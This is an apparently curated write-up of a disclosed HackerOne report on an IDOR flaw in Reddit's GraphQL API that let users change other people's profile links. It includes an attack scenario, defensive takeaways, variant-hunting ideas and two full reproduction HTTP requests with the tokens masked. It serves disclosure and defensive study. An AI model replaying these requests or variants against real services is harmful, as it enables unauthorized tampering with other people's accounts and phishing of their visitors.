# IDOR allows an attacker to modify the links of any user

## Metadata
- **Source:** HackerOne
- **Report:** 1661113 | https://hackerone.com/reports/1661113
- **Submitted:** 2022-08-06
- **Reporter:** criptex
- **Program:** Reddit
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Insecure Direct Object Reference (IDOR), Insufficient Authorization, Broken Access Control
- **CVEs:** None
- **Category:** web-api

## Summary
An IDOR vulnerability in Reddit's GraphQL API allows authenticated attackers to modify social media links and custom links on any user's profile by directly manipulating link IDs in API requests. The vulnerability bypasses authorization checks and enables attackers to inject malicious links into victim profiles at scale, potentially for phishing or social engineering attacks.

## Attack scenario
1. Attacker authenticates to Reddit and sends a GraphQL query to retrieve a target user's profile links, receiving their unique link IDs in the response
2. Attacker captures the link ID for a victim user's existing social media link or custom link entry
3. Attacker crafts a mutation request containing the victim's link ID but with malicious data (e.g., phishing URL, malware link) while using their own authentication token
4. The API processes the mutation without verifying ownership, allowing the attacker to modify the victim's link content
5. The malicious link is saved to the victim's profile and becomes visible to all users viewing that profile
6. Victims click the injected malicious links, leading to phishing, credential theft, or malware distribution

## Root cause
The GraphQL API endpoint for updating social links performs only authentication checks (verifying a valid bearer token exists) but fails to perform authorization checks (verifying the authenticated user owns the link being modified). The API trusts the link ID parameter without validating that it belongs to the requesting user, allowing arbitrary link modification.

## Attacker mindset
An attacker would recognize that social links on user profiles are highly visible and trusted by visitors. By directly referencing link IDs without ownership validation, they can inject malicious URLs at scale to harvest credentials, spread malware, or conduct phishing campaigns. The persistence of modified links on profiles increases the attack surface.

## Defensive takeaways
- Implement strict authorization checks on all API endpoints - verify the authenticated user owns the resource being modified before allowing updates
- Use indirect object references (generate opaque tokens per user/session) instead of exposing sequential or predictable IDs
- Validate ownership of resources by querying the user ID from the authenticated session and comparing against the resource owner
- Apply rate limiting to mutation endpoints to prevent bulk exploitation
- Log all profile modifications and implement audit trails for security monitoring
- Add server-side validation of URLs being stored as social links (blocklist dangerous domains, validate format)
- Implement CSRF protection on state-changing operations
- Conduct comprehensive authorization testing during development and in security reviews

## Variant hunting
Check other user profile modification endpoints (bio, avatar, banner) for similar IDOR patterns
Test other GraphQL mutations that modify user-owned resources (settings, preferences, content)
Investigate batch operations or bulk update endpoints for authorization bypasses
Search for other direct ID references in API responses that might be exploitable
Test whether link deletion or reordering operations have the same vulnerability
Check if the vulnerability extends to user blocking/following lists or other relationship data

## MITRE ATT&CK
- T1190
- T1133
- T1078

## Notes
This is a classic IDOR vulnerability in a GraphQL API context. The reporter provided clear reproduction steps with actual API requests. The impact is amplified because profile links are prominent, visible to all users, and implicitly trusted. Reddit's delayed propagation (noted 'may have to reload page') suggests eventual consistency architecture. The vulnerability appears to affect a core GraphQL mutation endpoint used for profile customization.

## Full report
<details><summary>Expand</summary>

Hi team!

I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:

{F1855366}

##To reproduce this:

- Replicate the following request by replacing it with your own authentication headers:
You must also put in the body of the request, in the parameter "username" the username that you want,  you can try my username: "criptexhackerone1".
This request will return in the response the links of any user profile with the "id" of each link.


```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

- When you get some "id" save it.
- In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```
- Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.

## Impact

A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.

Best Regards!!!

</details>

---
*Analysed by Claude on 2026-05-11*
